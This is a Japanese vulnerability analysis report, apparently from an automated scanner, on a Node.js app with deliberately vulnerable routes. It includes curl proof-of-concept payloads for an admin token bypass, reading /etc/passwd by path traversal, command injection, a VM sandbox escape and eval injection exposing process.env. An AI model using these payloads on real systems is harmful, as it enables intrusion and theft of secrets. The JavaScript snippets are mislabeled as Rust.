# 解析レポート

![中高信頼度](https://img.shields.io/badge/信頼度-中高-orange) **信頼度スコア: 80**

## 脆弱性タイプ

- `AFO`
- `LFI`
- `RCE`

## 解析結果

このコードベースでは、以下の主要な脆弱性を確認しました。

1. BusinessLogicBypass.processPayment: 管理者トークンによる無制限バイパス（TOCTOU競合状態を含む）
2. /file/advanced-ops の copy/write/exec/compress: パストラバーサル、任意ファイル書き込み、コマンドインジェクション
3. /vm/execute: VM サンドボックス脱出による任意コード実行
4. /query/graph: eval を用いたクエリ解決でのコードインジェクション
5. LDAP 検索: パラメータを連結した LDAP インジェクション
6. Distributed coordinate: タイミング攻撃によるヒントリーク
7. /auth/multi-step: ステップ操作の直接バイパス
8. /cache/:key: ホストヘッダを使ったキャッシュ汚染
9. パラメータ操作による価格計算のディスカウントスタッキング

全体的にユーザ入力の検証・サニタイズがまったく行われておらず、重要操作への直接バイパスや任意コード実行に至ります。

## PoC（概念実証コード）

```text
1. BusinessLogicBypass 管理者バイパス例:
   curl -X POST http://localhost:3000/payment/process -H 'Content-Type: application/json' -d '{"userId":"u1","amount":1,"recipient":"u2","adminToken":"bypass_all_checks"}'

2. パストラバーサル + 任意読み取り例:
   curl -X POST http://localhost:3000/file/advanced-ops -H 'Content-Type: application/json' -d '{"operation":"copy","source":"../../etc/passwd","destination":"/tmp/pw"}'

3. コマンドインジェクション例:
   curl -X POST http://localhost:3000/file/advanced-ops -H 'Content-Type: application/json' -d '{"operation":"exec","source":"/etc/passwd; echo vulerable"}'

4. VM 脱出例:
   curl -X POST http://localhost:3000/vm/execute -H 'Content-Type: application/json' -d '{"code":"constructor.constructor(`return process`)().exit()"}'

5. Graph eval インジェクション例:
   curl -X POST http://localhost:3000/query/graph -H 'Content-Type: application/json' -d '{"query":"{constructor.constructor(\"return process.env\")()}"}'
```

## 関連コードコンテキスト

### 関数名: BusinessLogicBypass.processPayment
- 理由: 管理者トークンチェックによる無制限バイパス
- パス: routes/advanced.js
```rust
if (this.adminTokens.has(adminToken)) {
```

### 関数名: BusinessLogicBypass.processPayment
- 理由: TOCTOU競合状態の発生箇所
- パス: routes/advanced.js
```rust
await new Promise(resolve => setTimeout(resolve, 100));
```

### 関数名: /file/advanced-ops copy
- 理由: パストラバーサルにより任意ファイル読み取り可能
- パス: routes/advanced.js
```rust
fs.readFileSync(source);
```

### 関数名: /file/advanced-ops write
- 理由: 任意ファイル書き込み
- パス: routes/advanced.js
```rust
fs.writeFileSync(destination, decodedContent);
```

### 関数名: /file/advanced-ops exec
- 理由: コマンドインジェクションの起点
- パス: routes/advanced.js
```rust
execSync(`cat ${source} | head -10`, { encoding: 'utf8' });
```

### 関数名: /vm/execute
- 理由: サンドボックス脱出による任意コード実行可能
- パス: routes/advanced.js
```rust
script.runInNewContext(vmContext, { timeout });
```

### 関数名: /query/graph resolveQuery
- 理由: eval によるクエリ内コード実行
- パス: routes/advanced.js
```rust
return eval(field);
```

### 関数名: /ldap/search
- 理由: LDAP インジェクション
- パス: routes/advanced.js
```rust
let ldapQuery = `(&(objectClass=person)(uid=${username}))`;
```

### 関数名: /distributed/coordinate
- 理由: タイミング攻撃によるシークレットリーク
- パス: routes/advanced.js
```rust
for (let i = 0; i < secret.length && i < expectedSecret.length; i++) {
```

### 関数名: /smuggling/test
- 理由: HTTP リクエストスマグリングの示唆
- パス: routes/advanced.js
```rust
if (transferEncoding && contentLength) {
```

## 解析ノート

脆弱性多数: 管理者バイパス, レース条件, パストラバーサル, ファイル書き込み, コマンド注入, VM 脱出, eval 注入, LDAP 注入, タイミング攻撃, スマグリング。各エンドポイントでユーザ入力を直接利用。

